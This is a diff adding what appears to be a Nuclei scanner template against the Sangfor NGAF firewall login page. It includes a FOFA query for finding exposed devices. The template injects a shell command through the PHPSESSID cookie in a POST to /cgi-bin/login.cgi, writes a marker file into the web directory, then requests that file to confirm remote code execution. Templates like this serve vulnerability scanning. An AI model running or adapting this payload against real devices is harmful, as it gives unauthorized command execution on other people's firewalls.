@@ -1,0 +1,37 @@
+id: NGAF_login
+info:
+  name: 深信服下一代防火墙NGAF login
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="SANGFOR-防火墙类产品"
+http:
+  - raw:
+      - |
+        POST /cgi-bin/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+        Connection: close
+        Content-Length: 112
+        Content-Type: Application/X-www-Form
+        Cookie: PHPSESSID=`$(echo 20231102 > /fwlib/sys/virus/webui/svpn_html/mikes.txt)`;
+        Accept-Encoding: gzip
+
+        {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
+
+      - |
+        GET /svpn_html/mikes.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231102"
